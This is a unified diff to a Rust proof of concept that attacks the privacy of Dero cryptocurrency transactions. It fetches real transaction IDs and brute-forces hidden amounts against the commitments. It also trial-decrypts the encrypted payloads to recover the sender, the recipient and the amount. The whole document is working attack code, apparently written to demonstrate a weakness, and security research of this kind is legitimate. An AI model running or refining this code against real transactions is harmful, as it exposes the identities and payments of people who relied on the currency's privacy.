@@ -170,6 +170,7 @@ fn encode_point(point: G1Projective) -> [u8; 33] {
 
 // Perform a trial decryption
 fn decrypt(
+    joint_ring_len: usize,
     shared_key: G1Projective,
     output_key: [u8; 33],
     mut payload: [u8; PAYLOAD_LIMIT],
@@ -179,36 +180,48 @@ fn decrypt(
 
     let key = keccak256(&[shared_key.as_slice(), &output_key].concat());
     chacha20::XChaCha20::new(&key.into(), &[0; 24].into()).apply_keystream(&mut payload);
-    let mut cbor_and_zero_padding = &payload[1..];
 
-    // Check the last 16 bytes are zero
-    // This isn't necessary. It only works when the last 16 bytes are unused and the wallet
-    // zero-pads
-    // We can alternatively check the start is a valid CBOR array, due to the Dero wallet software
-    // using CBOR
-    // We don't immediately do that as our cbor lib doesn't handle malformed messages
-    // We'd need to roll a new one which is out of scope for this PoC
-    for b in &cbor_and_zero_padding[(PAYLOAD_LIMIT - 16)..] {
+    // TODO: Also check this supposed sender index matches the sender ring, based on parity
+    if usize::from(payload[0]) > joint_ring_len {
+        None?;
+    }
+
+    // Check the CBOR
+    let mut cbor_and_zero_padding = &payload[1..];
+    use cbor4ii::core::{
+        dec::{Decode, Read},
+        types::Map,
+        utils::SliceReader,
+        Value,
+    };
+    let mut cbor_and_zero_padding = SliceReader::new(cbor_and_zero_padding);
+    let Ok(cbor) = Map::<Vec<(String, Value)>>::decode(&mut cbor_and_zero_padding) else {
+        None?
+    };
+    // If the rest isn't all zeroes, this buffer isn't a zero-padded CBOR object
+    for b in cbor_and_zero_padding.fill(usize::MAX).unwrap().as_ref() {
         if *b != 0 {
-            return None;
+            None?
         }
     }
 
-    // Strip the 0 padding so we have a clean CBOR value
-    while cbor_and_zero_padding.last() == Some(&0) {
-        cbor_and_zero_padding = &cbor_and_zero_padding[..cbor_and_zero_padding.len() - 1];
+    // Check the types are as expected
+    for (key, value) in &cbor.0 {
+        if !(match key.chars().last() {
+            Some('S') => matches!(value, Value::Text(_)),
+            Some('I') => matches!(value, Value::Integer(_)),
+            Some('U') => matches!(value, Value::Integer(_)),
+            Some('F') => matches!(value, Value::Float(_)),
+            Some('H') => true, // TODO
+            Some('A') => true, // TODO
+            Some('T') => true, // TODO
+            _ => false,
+        }) {
+            None?
+        }
     }
-    // Check the CBOR
-    // While an empty CBOR is 4 bytes, and not enough to statistically verify the decryption,
-    // Dero appears to always have a field for the value and a comment, which should offer
-    // decent statistical soundness
-    let cbor = cbor::Decoder::from_bytes(cbor_and_zero_padding)
-        .items()
-        .collect::<Result<Vec<_>, _>>();
-    if cbor.is_err() {
-        None?;
-    }
-    dbg!(cbor.unwrap());
+
+    dbg!(cbor.0);
 
     // The first byte is the sender index in the ring since it was 'fixed' six months ago
     Some(payload[0])
@@ -286,6 +299,45 @@ async fn fetch_tx_with_retry(tx_hash_hex: &str) -> Option<Vec<(Vec<[u8; 33]>, Tr
     }
 }
 
+fn brute_force_amount(
+    keys: &[[u8; 33]],
+    commitments: &[G1Projective],
+    payload: [u8; PAYLOAD_LIMIT],
+    amount_generator: G1Projective,
+    amount_increment: u64,
+    max_iters: usize,
+) -> bool {
+    let amount_generator = amount_generator * ark_bn254::Fr::from(amount_increment);
+
+    let mut amount = G1Projective::zero();
+    for amount_iter in 0..=max_iters {
+        if (amount_iter % 10000) == 0 {
+            dbg!(amount_iter);
+        }
+        // TODO: Only attempt deceryption for the receiver ring, which can be differentiated by parity
+        for (key, commitment) in keys.iter().zip(commitments) {
+            if let Some(sender) = decrypt(keys.len(), commitment - amount, *key, payload) {
+                let sender = hex::encode(keys[usize::from(sender)].as_slice());
+                let recipient = hex::encode(key);
+                if sender == recipient {
+                    println!(
+                        "TX encoded recipient as sender and is accordingly on old wallet software"
+                    );
+                } else {
+                    dbg!(sender);
+                }
+                dbg!(recipient);
+                dbg!(u64::try_from(amount_iter).unwrap() * amount_increment); // Amount
+                println!("---");
+                return true;
+            }
+        }
+        amount += amount_generator;
+    }
+    false
+}
+
+#[allow(clippy::inconsistent_digit_grouping)]
 #[tokio::main]
 async fn main() {
     let amount_generator = decode_point(
@@ -294,47 +346,64 @@ async fn main() {
 
     let mut tx_ids: Vec<&str> = vec![
         // This is a TX ID with a known amount (2, which is quite low) found on a GH repo
-        "88e4c1731d9d0096bccde4b1766413df7af11e6d41d68284a3b842cd348c96f0",
-        // This is a random TX from a few days ago
-        "342cd00ef163b661a5c68790e59efcb7cd76d41dc72a013c596973af06de03b5",
-        // Another random TX
-        "51271a66bfac64c7eff73e66cc81e3abbd74ffe396145df090275b771e668ba0",
+        "88e4c1731d9d0096bccde4b1766413df7af11e6d41d68284a3b842cd348c96f0", // 2
+        // Random TXs
+        "6f627d5aba7f36307bbd009540eea7b7b0f5c82de851d8ff425f96eabfc1c6bf", // 135000
+        "65a2e916871ba94e1190e16a2a7d998fc195cccc64fab4052610741240599f94", // 12200
+        "342cd00ef163b661a5c68790e59efcb7cd76d41dc72a013c596973af06de03b5", // 3995
+        "51271a66bfac64c7eff73e66cc81e3abbd74ffe396145df090275b771e668ba0", // 20000
     ];
     for tx_id in tx_ids {
         let Some(tx) = fetch_tx_with_retry(tx_id).await else {
             continue;
         };
-        for (keys, transfer) in tx {
+        for (t, (keys, transfer)) in tx.into_iter().enumerate() {
+            dbg!(tx_id, t);
             assert_eq!(keys.len(), transfer.statement.commitments.len());
             let mut commitments = vec![];
             for commitment in &transfer.statement.commitments {
                 commitments.push(decode_point(commitment.to_vec()));
             }
 
-            let mut amount_u64 = 0;
+            let mut amount_iter = 0;
             let mut amount = G1Projective::zero();
 
-            'transfer: loop {
-                // TODO: Only attempt deceryption for the receiver ring, which can be differentiated by parity
-                for (key, commitment) in keys.iter().zip(&commitments) {
-                    if let Some(sender) = decrypt(commitment - amount, *key, transfer.payload) {
-                        dbg!(tx_id);
-                        let sender = hex::encode(keys[usize::from(sender)].as_slice());
-                        let recipient = hex::encode(key);
-                        if sender == recipient {
-                            println!("TX encoded recipient as sender and is accordingly on old wallet software");
-                        } else {
-                            dbg!(sender);
-                        }
-                        dbg!(recipient);
-                        dbg!(amount_u64); // Amount
-                        println!("---");
-                        break 'transfer;
-                    }
-                }
-                amount_u64 += 1;
-                amount += amount_generator;
+            // Brute force more likely amounts instead of doing a properly exhaustive search
+            // 0 ..= 0.00005 DERO, in atomic units
+            if brute_force_amount(
+                &keys,
+                &commitments,
+                transfer.payload,
+                amount_generator,
+                1,
+                5,
+            ) {
+                continue;
             }
+            // 0 ..= 0.5 DERO, in atomic units
+            if brute_force_amount(
+                &keys,
+                &commitments,
+                transfer.payload,
+                amount_generator,
+                1,
+                50000,
+            ) {
+                continue;
+            }
+            // 0 ..= 400 DERO, in units of .01
+            if brute_force_amount(
+                &keys,
+                &commitments,
+                transfer.payload,
+                amount_generator,
+                1000,
+                40000,
+            ) {
+                continue;
+            }
+            println!("couldn't brute force amount in a reasonable (for this PoC) amount of time for {tx_id}");
+            println!("---");
         }
     }
 }
